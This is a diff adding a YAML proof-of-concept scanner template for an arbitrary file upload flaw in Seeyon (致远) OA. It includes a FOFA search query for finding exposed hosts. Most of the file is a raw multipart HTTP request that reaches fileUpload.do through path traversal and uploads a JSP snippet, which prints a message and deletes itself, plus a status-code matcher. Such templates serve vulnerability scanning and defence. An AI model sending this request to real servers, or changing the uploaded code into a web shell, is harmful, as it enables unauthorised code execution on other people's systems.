@@ -1,0 +1,123 @@
+id: poc-qov0fewdtge6x3zf
+info:
+  name: 致远OA fileUpload.do 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qov0fewdtge6x3zf'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qov0fewdtge6x3zf
+    fofa: title="协同管理软件 V5.6SP1"
+http:
+- raw:
+  - 'POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
+
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+
+    Content-Type: multipart/form-data; boundary=786jbhfjhbinbhbhbjh786
+
+
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+    Content-Disposition: form-data; name="type"
+
+
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+    Content-Disposition: form-data; name="extensions"
+
+
+
+
+    png
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+
+
+    Content-Disposition: form-data; name="applicationCategory"
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+
+
+    Content-Disposition: form-data; name="destDirectory"
+
+
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+    Content-Disposition: form-data; name="destFilename"
+
+
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+    Content-Disposition: form-data; name="maxSize"
+
+
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+    Content-Disposition: form-data; name="isEncrypt"
+
+
+
+
+    false
+
+
+    --786jbhfjhbinbhbhbjh786
+
+
+    Content-Disposition: form-data; name="file1"; filename="1.png"
+
+
+    Content-Type: Content-Type: application/pdf
+
+
+
+
+    <% out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+
+    --786jbhfjhbinbhbhbjh786--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    application/pdf
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
